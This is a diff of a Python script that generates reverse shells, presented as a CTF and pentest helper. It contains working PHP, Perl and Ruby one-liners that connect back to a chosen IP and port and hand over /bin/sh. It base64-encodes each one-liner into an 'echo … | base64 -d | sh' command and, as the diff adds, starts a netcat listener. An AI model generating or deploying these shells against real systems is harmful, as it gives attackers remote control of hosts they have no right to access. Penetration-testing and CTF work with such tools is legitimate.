@@ -1,11 +1,13 @@
 #!/usr/bin/python3
 #reverse shell generator
-#quickly generates reverse shells that can be used durings ctfs or in pentest for a quick pivot.
-#Shell templates taken from pentestmonkey.net
+#quickly generates reverse shells that can be used durings ctfs or in pentest for a quick pivot
+#shell templates taken from pentestmonkey.net
 
 from base64 import b64encode
 from subprocess import check_output
 from sys import argv
+from os import system
+from argparse import ArgumentParser
 
 green = "\033[32m"
 reset = "\033[0m"
@@ -20,6 +22,11 @@ templates['php'] = '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&
 templates['perl'] = '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
 templates['ruby'] = '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
 
+parser = ArgumentParser()
+parser.add_argument("--ip", help="ip for the reverse shell to connect to")
+parser.add_argument("--port", help="port for the reverse shell to connect to",default=666)
+parser.add_argument("--format", help=f"generate reverse shells for this format, available: {', '.join(list(templates.keys()))}. default=all",default='all')
+parser.add_argument("--no-nc",action='store_true',default=False,help='do not start a netcat listener')
 
 def build_b64_cmd(c):
 	return f'echo {b64encode(c.encode()).decode()} | base64 -d | sh'
@@ -29,12 +36,34 @@ def get_local_ips():
 	all = check_output('ifconfig',shell=True).decode().split('\n\n')[:-1]
 	for interface in all:
 		name = interface.split(':')[0]
-		if name != 'lo' and 'inet' in interface:
+		if name != 'lo':
 			ip = interface.split('inet')[1].split()[0]
 			out.append((name,ip))
 	return out
 
-def gen_shells(ip,port):
+def enter_num(min,max):
+	while True:
+		try:
+			i = int(input(f'Choice: '))
+			assert min <= i <= max
+			return i
+		except KeyboardInterrupt:
+			exit()
+		except Exception:
+			continue
+
+def select_ip():
+	print('select an ip')
+	ips = get_local_ips()
+	for ind,ip in enumerate(ips):
+		print(f'[{ind}]{ip[0]} {ip[1]}')
+	return(ips[enter_num(0,ind)][1])
+
+def select_port():
+	print('Select a port (1-65536)')
+	return enter_num(0,65536)
+
+def gen_shells(ip,port,templates):
 	for template in templates:
 		cmd = templates[template].format(ip=ip,port=port)
 		encoded = build_b64_cmd(cmd)
@@ -43,41 +72,33 @@ def gen_shells(ip,port):
 		print(f'base64: {encoded}')
 
 def main():
-	if len(argv) == 3:
-		ip = argv[0]
-		port = argv[1]
+	args = parser.parse_args()
 
-	elif len(argv) == 2:
-		ip = argv[0]
-		port = 666
+	if not args.format == 'all':
+		if not args.format in templates.keys():
+			print(f'format {args.format} not found.')
+			exit(-1)
+		else:
+			t = {}
+			t[args.format] = templates[args.format]
+	else:
+		t = templates
 
-	elif len(argv) == 1:
-		ips = list(get_local_ips())
-		for ind,e in enumerate(ips):
-			print(f'({ind}) {e[0]} : {e[1]}')
-		while True:
-			try:
-				i = input('ip [0]:')
-				if not i:
-					ip = ips[0][1]
-				else:
-					c = int(i)
-					ip = ips[c][1]
-				break
-			except:
-				print(f'enter a number between 0 and {ind}')
+	if not args.ip:
+		ip = select_ip()
+	else:
+		ip = args.ip
 
-		while True:
-			try:
-				port = input('port [666]:')
-				if not port:
-					port = 666
-				else:
-					port = int(port)
-				break
-			except:
-				pass
+	if not args.port:
+		port = select_port()
+	else:
+		port = args.port
 
-	gen_shells(ip,port)
+	gen_shells(ip,port,t)
 
-main()
+	if not args.no_nc:
+		print('starting netcat listener...')
+		system(f'nc -lvp {port}')
+
+if __name__ == '__main__':
+	main()
